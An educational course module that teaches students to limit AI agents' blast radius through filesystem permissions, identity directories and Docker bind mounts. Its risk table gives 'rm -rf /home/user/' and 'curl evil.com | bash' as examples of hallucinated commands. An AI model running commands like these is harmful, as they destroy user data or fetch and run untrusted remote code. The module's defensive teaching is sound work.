# Terminal and Filesystem Isolation for Agent Safety
<!--
author:   William Mongan
language: en
narrator: US English Male

comment: Render with https://liascript.github.io/course/?https://github.com/BillJr99/Ursinus-CS357/blob/gh-pages/_pages/Activities/liascript-terminalfilesystem.md or locally via https://www.billmongan.com/LiaScript/?https://raw.githubusercontent.com/BillJr99/Ursinus-CS357/gh-pages/_pages/Activities/liascript-terminalfilesystem.md

import: https://raw.githubusercontent.com/liascript/CodeRunner/master/README.md

link:   https://cdn.jsdelivr.net/gh/BillJr99/Ursinus-Boilerplate-Assets@main/css/liascript-custom.css?v=2025-08-23-4
        https://fonts.googleapis.com/css2?family=Lexend+Deca&display=swap

-->

# Terminal and Filesystem Isolation for Agent Safety

An agent that can write to any path on your filesystem is as dangerous as an employee with a master key who has never been told what rooms are off-limits. The key insight of filesystem isolation is not that agents are malicious - it is that agents make *mistakes*, and a mistake inside a bounded workspace is recoverable while a mistake that touches your SSH keys, your production database credentials, or your system binaries may not be.

**Blast radius** is the term security engineers use for "how much damage can one mistake cause?" A well-isolated agent has a small blast radius: even if it does something wrong, the consequences are limited to its designated workspace. This module develops the UNIX concepts, Docker primitives, and practical patterns you need to design small-blast-radius agent deployments.

---

## Directions and Group Roles

Work in your POGIL team with rotated roles (**Manager**, **Recorder**, **Presenter**, **Reflector**). The Reflector should pay special attention to assumptions the team makes about what is "obviously safe" - in security, obvious assumptions are where vulnerabilities live. The Recorder will document the team's bash command sequence for Exercise 1. The Presenter will explain the team's answer to Question 8 to the class.

---

## Model 1: Filesystem Access Permissions for Three Agent Configurations

The three configurations below represent a spectrum from minimal to dangerous. Each row describes a real deployment pattern. Study the access model and the resulting risk level before answering questions.

| Agent Type | Filesystem Access | Network Access | Can Execute Shell? | Risk Level | Why |
|---|---|---|---|---|---|
| **Research Agent** | Read-only bind mount of `/home/user/knowledgebase` only; no write access to any path | Outbound HTTPS to whitelisted domains only | No - tool calls only, no `subprocess` or `exec` | Low | Can read stale data, but cannot modify files, exfiltrate secrets it cannot read, or install software |
| **Writer Agent** | Write access to `/workspace/output` only; read access to `/workspace/input` (read-only); no access to rest of filesystem | No network access | No | Low-Medium | Can write incorrect output, but blast radius is limited to the `/workspace/output` directory; cannot read secrets or call home |
| **Admin Agent** | Full read/write access to `/` (the root filesystem) | Unrestricted network access | Yes - can run arbitrary shell commands | Critical | A single hallucinated command (`rm -rf /home/user/` or `curl evil.com | bash`) is unrecoverable; there is no blast radius limit |

### Critical Thinking Questions

1. The Research Agent is described as "read-only" but still has a non-trivial risk: it can read stale data. Explain what "stale data" means in the context of a knowledge base, and describe a scenario where reading correct-but-outdated information causes a downstream agent to produce harmful output.
2. The Admin Agent's risk level is "Critical" even though its purpose (administration) might seem to require full access. Propose a way to decompose the Admin Agent's tasks into two or more lower-privilege agents that together accomplish the same goals with a smaller blast radius.
3. The Writer Agent has *no network access*. Why might this restriction be specifically important for an LLM-powered writer agent, beyond the general principle of least privilege?

---

## Model 2: Setting Up Identity Directories and Running a Constrained Agent

Each agent in a multi-agent system should have its own **identity directory**: a home directory that contains only that agent's configuration, memory files, logs, and workspace. Agents that share a home directory can accidentally read each other's memory or logs, creating information leakage between agents that were designed to be independent.

The following terminal session sets up a two-agent workspace with isolated identity directories.

```bash
# Create top-level agents directory under the project root
mkdir -p /home/user/projects/myapp/agents

# Create identity directories for each agent
mkdir -p /home/user/projects/myapp/agents/researcher/{config,memory,logs,workspace}
mkdir -p /home/user/projects/myapp/agents/writer/{config,memory,logs,workspace}

# Set restrictive permissions: only the owning user can read/write
chmod 700 /home/user/projects/myapp/agents/researcher
chmod 700 /home/user/projects/myapp/agents/writer

# Create a read-only shared knowledge base the researcher can access
mkdir -p /home/user/projects/myapp/shared/knowledgebase
chmod 755 /home/user/projects/myapp/shared/knowledgebase  # world-readable

# Create an output directory the writer can write to
mkdir -p /home/user/projects/myapp/shared/output
chmod 750 /home/user/projects/myapp/shared/output

# When running the researcher agent via Docker, bind-mount only what it needs:
# - its own identity directory (read-write)
# - the shared knowledge base (read-only)
# Note: the writer's identity directory is NOT mounted - researcher cannot see it
docker run --rm \
  -v /home/user/projects/myapp/agents/researcher:/home/agent:rw \
  -v /home/user/projects/myapp/shared/knowledgebase:/data/kb:ro \
  --network none \
  my-researcher-image \
  python agent.py --task "summarize recent papers on RAG retrieval"

# When running the writer agent, mount only what IT needs:
# - its own identity directory
# - the shared output directory (write)
# - the researcher's OUTPUT (read-only - it reads summaries, not researcher config)
docker run --rm \
  -v /home/user/projects/myapp/agents/writer:/home/agent:rw \
  -v /home/user/projects/myapp/shared/output:/workspace/output:rw \
  -v /home/user/projects/myapp/agents/researcher/workspace:/workspace/input:ro \
  --network none \
  my-writer-image \
  python agent.py --task "draft a 500-word section from the summaries"
```

### Critical Thinking Questions

4. In the Docker commands above, the researcher's full identity directory is NOT mounted into the writer's container. The writer only gets `researcher/workspace` as read-only input. Why is this distinction important? What information in the researcher's identity directory should the writer not be able to see?
5. Both agents run with `--network none`. The researcher needs to access a web search API. Rewrite the researcher's `docker run` command to allow *only* outbound HTTPS traffic to `api.searchprovider.com`, and explain what additional infrastructure would be needed to enforce this restriction.
6. Log files in `agents/researcher/logs/` accumulate over time. Explain why these logs function as an **audit trail** and describe two specific things you could learn from reviewing them after an agent run completes.

[[MC]]
An agent's **identity directory** is designed to:
- ( ) Give the agent access to the entire user home directory for maximum flexibility
- ( ) Store the agent's model weights and embedding indices
- (x) Provide each agent with an isolated space for its own config, memory, logs, and workspace so agents cannot accidentally access each other's state
- ( ) Replace Docker isolation as a lighter-weight alternative

---

## Model 3: Docker Volume Mounts - What Can the Agent Touch?

Two students are deploying the same researcher agent. Their Docker commands look similar but have dramatically different security properties. Study the difference carefully.

**Student A's command:**

```bash
docker run --rm \
  -v /home/user:/home/user \
  my-researcher-image \
  python agent.py
```

**Student B's command:**

```bash
docker run --rm \
  -v /home/user/agents/researcher:/workspace:ro \
  my-researcher-image \
  python agent.py
```

| Question | Student A | Student B |
|---|---|---|
| What path does the agent see inside the container? | `/home/user` - the full user home directory | `/workspace` - only the researcher's directory |
| Can the agent read `~/.ssh/id_rsa`? | Yes - SSH keys are in `/home/user/.ssh/` which is mounted | No - only `/workspace` is mounted |
| Can the agent read `~/.aws/credentials`? | Yes - AWS credentials are in the mounted home directory | No |
| Can the agent modify files it reads? | Yes - the mount has no `:ro` flag | No - the `:ro` flag makes the mount read-only |
| If the agent hallucinates a destructive write command, what is damaged? | Any file in `/home/user/` including projects, dotfiles, credentials | Write fails immediately - the filesystem is read-only |
| What is the blast radius? | Everything owned by the user | Zero - read-only mount |

### Critical Thinking Questions

7. Student A's mount exposes `~/.gitconfig`, which typically contains the user's name and email. This is not sensitive in the way SSH keys are, but it could still be misused. Describe how an agent with read access to `.gitconfig` and write access to a git repository might use this information in a way the user did not intend.
8. Student B's mount is read-only, which prevents the researcher agent from writing its own logs or memory files. This seems to break the identity-directory pattern from Model 2. How do you resolve this tension? Revise the Student B command to allow write access to a specific subdirectory while keeping everything else read-only.
9. Two agents share a single read-write filesystem volume (`/shared/output`). Agent 1 writes a file called `draft.md`. Agent 2 also writes a file called `draft.md`. What happens, and why is this a problem? What naming convention or coordination mechanism would prevent it?

---

## Exercises

1. **Build a safe agent workspace.** Write the complete sequence of `mkdir`, `chmod`, and `docker run` commands to set up a safe workspace for a three-agent pipeline (ResearchAgent, WriterAgent, CriticAgent). Each agent should have its own identity directory. Data flow should be: ResearchAgent writes to its own workspace, WriterAgent reads ResearchAgent's workspace (read-only) and writes to its own, CriticAgent reads WriterAgent's workspace (read-only) and writes its verdict to a shared `/output` directory. No agent should be able to read another agent's config or logs directory. Your Recorder writes the commands; your Presenter explains the permission design.

2. **Blast radius calculation.** For each of the following agent configurations, calculate and justify its blast radius - the maximum damage a single bad command could cause: (a) Agent runs as root with full filesystem mount. (b) Agent runs as non-root user `agentuser` with write access only to `/workspace/output`. (c) Agent runs in Docker with `--read-only` flag and a single tmpfs mount at `/tmp`. Rank the three configurations from safest to most dangerous and explain your ranking.

3. **Filesystem as memory.** An agent writes its working notes to `memory/notes.md` and its completed task list to `memory/completed.json` inside its identity directory. Compared to keeping all of this in the LLM's in-context memory (the conversation history), list two advantages and two disadvantages of file-based memory. When would you prefer in-context memory? When would you prefer file-based?

---

## Reflection Prompt

In your notebook: the principle of least privilege says every process should have exactly the access it needs to do its job and nothing more. We apply this to agents today, but it applies to human roles in organizations too. Think of a role you have held (job, club, team) where you had more access than you needed. Did that access create any risks you were aware of at the time? Would the principle of least privilege have made the organization safer?

---

## Further Reading

- "The Principle of Least Privilege." OWASP Top Ten documentation. https://owasp.org/www-project-developer-guide/draft/design/web_app_checklist/digital_identity/ - foundational security principle applied throughout this module.
- Docker Documentation: "Use volumes." https://docs.docker.com/storage/volumes/ - specifically the sections on bind mounts vs. named volumes and read-only mounts.
- Julia Evans. "How containers work: overlayfs." https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/ - intuitive explanation of what Docker isolation actually does at the filesystem level.
- Saltzer and Schroeder. "The Protection of Information in Computer Systems." *Proceedings of the IEEE* (1975). The original paper enumerating least privilege, fail-safe defaults, and economy of mechanism - principles that are fifty years old and still directly applicable to agent design.
